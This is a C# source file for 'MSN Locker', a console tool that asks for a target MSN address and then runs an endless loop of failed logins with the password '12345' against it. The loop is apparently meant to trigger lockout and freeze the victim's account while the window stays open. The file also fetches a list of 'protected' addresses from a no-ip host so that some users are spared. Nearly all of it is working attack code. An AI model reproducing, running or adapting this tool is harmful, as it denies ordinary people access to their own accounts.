using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Net;
using System.Diagnostics;
using System.Media;

namespace msnlocker
{
    class Program
    {
        static string User;
        static int per;
        public static void Lock()
        {
            try
            {
                while (true)
                {
                    Authentication Auth = new Authentication(User);
                    Notification Notification = new Notification(Auth.ReturnNSAddress(), Auth.ReturnNSPort(), User, "12345");
                    ++per;
                }
            }
            catch { Console.WriteLine("Error During Lock! (Invalid MSN address, or a magic)"); }
        }

        static public void Update()
        {
            int lastper = per;
            while (true)
            {
                if (per > 10)
                    break;
                if (lastper != per)
                {
                    lastper = per;
                    Console.Clear();
                    Console.WriteLine("Locking... ({0}%)", (per * 10).ToString());
                }
            }
        }

        private static DateTime ConvertTimestamp(double timestamp)
        {
            //create a new DateTime value based on the Unix Epoch
            DateTime converted = new DateTime(1970, 1, 1, 0, 0, 0, 0);

            //add the timestamp to the value
            DateTime newDateTime = converted.AddSeconds(timestamp);

            //return the value in string format
            return newDateTime.ToLocalTime();
        }


        static void Main(string[] args)
        {
            Console.WriteLine("MSN Locker - by Adam");
            /*
            DateTime LicenseTill = ConvertTimestamp(1278478800);
            DateTime today = DateTime.Today;
            if (today.CompareTo(LicenseTill) > 0)
            {
                Console.WriteLine("Error! program is no longer functional!");
                Thread.Sleep(2500);
                return;
            }
            */
            Console.WriteLine("Type the MSN address you wish to lock:");
            User = Console.ReadLine().ToLower();
            Console.WriteLine("Locking user {0}, please standby...", User);
            SoundPlayer sp = new SoundPlayer(Resource1.Endless_6_9_2010_15_20_43);
            sp.Play();
            Thread.Sleep(2000);
            try
            {
                WebClient wc = new WebClient();
                string Protection = wc.DownloadString("http://wizcraft.no-ip.org/freak.html");
                string[] ProtectedMSNs = Protection.Split(new char[] { Convert.ToChar(" ") });
                foreach (string s in ProtectedMSNs)
                {
                    if (s.Trim() == User.Trim())
                    {
                        wc.Dispose();
                        Console.WriteLine("This MSN address is protected.");
                        for (int i = 0; i < 100; ++i)
                            Console.Beep(32767, 100);
                        return;

                    }
                }
                wc.Dispose();
            }
            catch { }
            Console.Clear();
            Thread t = new Thread(new ThreadStart(Lock));
            t.Start();
            Thread p = new Thread(new ThreadStart(Update));
            p.Start();
            while (p.IsAlive)
                Thread.Sleep(1);
            Console.Clear();
            Console.WriteLine("Frozen!, Close this window if you wish to un-lock the user.");
            while (true)
                Thread.Sleep(1);
        }
    }
}
